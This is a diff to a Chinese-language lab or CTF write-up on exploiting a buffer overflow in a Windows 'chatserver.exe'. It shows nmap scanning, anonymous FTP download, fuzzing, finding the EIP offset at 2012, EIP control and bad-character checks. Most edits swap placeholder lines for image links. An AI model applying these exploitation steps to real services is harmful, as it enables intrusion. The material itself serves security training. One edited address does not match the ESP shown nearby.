@@ -10,7 +10,6 @@ bash nmap -sC -sV <target-ip>
 
 9999/tcp open  unknown
 
-📷 端口扫描结果
 
 可以看到：
 
@@ -31,7 +30,6 @@ ftp <target-ip>
 Username: anonymous
 Password: anonymous
 
-📷 FTP 匿名登录
 
 成功登录后列出目录：
 
@@ -46,7 +44,8 @@ passive
 chatserver.exe
 seefunc.dll
 
-📷 FTP 文件列表
+
+![image](images/image.png)
 
 根据文件名推测：
 
@@ -57,8 +56,11 @@ seefunc.dll：依赖动态库
 下载文件：
 
 binary
+
 get chatserver.exe
+
 get seefunc.dll
+
 3. Vulnerability Discovery（漏洞发现）
 
 由于目标程序是 Windows 可执行程序，需要在 Windows 虚拟机 中调试。
@@ -73,8 +75,6 @@ Mona.py 插件
 
 在 Immunity Debugger 中运行程序。
 
-📷 Immunity Debugger 运行程序
-
 观察发现程序监听：
 
 Port 9999
@@ -83,7 +83,6 @@ Port 9999
 
 nc <win-ip> 9999
 
-📷 连接服务
 
 成功连接说明服务正常。
 
@@ -105,7 +104,7 @@ python3 -c "print('A'*2500)"
 
 发送后程序崩溃。
 
-📷 程序崩溃
+![image](images/image1.png)
 
 说明存在 缓冲区溢出漏洞。
 
@@ -121,7 +120,7 @@ msf-pattern_create -l 2500
 
 EIP = 31704330
 
-📷 EIP 值
+![image](images/image2.png)
 
 计算偏移量：
 
@@ -130,6 +129,8 @@ msf-pattern_offset -q 31704330 -l 2500
 结果：
 
 Offset = 2012
+
+![image](images/image3.png)
 
 4.3 验证 EIP 控制
 
@@ -145,7 +146,7 @@ payload = b"A"*2012 + b"B"*4
 
 EIP = 42424242
 
-📷 成功控制 EIP
+![image](images/image4.png)
 
 说明攻击者可以 控制返回地址。
 
@@ -175,9 +176,9 @@ ESP = 0290EEA8
 
 执行比较：
 
-!mona compare -f C:\mona\chatserver\bytearray.bin -a 0290EEA8
+!mona compare -f C:\mona\chatserver\bytearray.bin -a 00A1EEA8
 
-📷 坏字符检测
+![image](images/image5.png)
 
 结果：
 
